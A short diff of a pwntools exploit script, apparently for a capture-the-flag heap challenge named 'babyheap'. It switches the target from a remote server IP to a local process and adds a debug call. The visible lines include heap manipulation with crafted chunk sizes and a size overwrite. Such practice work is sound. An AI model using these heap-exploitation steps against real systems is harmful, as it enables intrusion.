@@ -1,5 +1,5 @@
 from pwn import *
-context.binary = ELF('./babystack')
+context.binary = ELF('./babyheap')
 context.log_level = 'debug'
 elf= context.binary
 libc = elf.libc
@@ -35,6 +35,7 @@ def exploit():
 	free(0)
 
 	add(0x68, 'a'*0x60 + p64(0x300))
+	dbg()
 	free(4)
 
 	add(0x100, 'a'*0x10)
@@ -66,8 +67,8 @@ def exploit():
 
 
 if __name__ == '__main__':
-	p = remote('120.78.153.191', 22043)
-	libc = ELF('./libc.so.6')
+	#p = remote('120.78.153.191', 22043)
+	#libc = ELF('./libc.so.6')
 	elf= ELF('./babyheap')
-	#p = elf.process()		#env={'LD_PRELOAD':'./libc.so.6'}
+	p = elf.process()		#env={'LD_PRELOAD':'./libc.so.6'}
 	exploit()
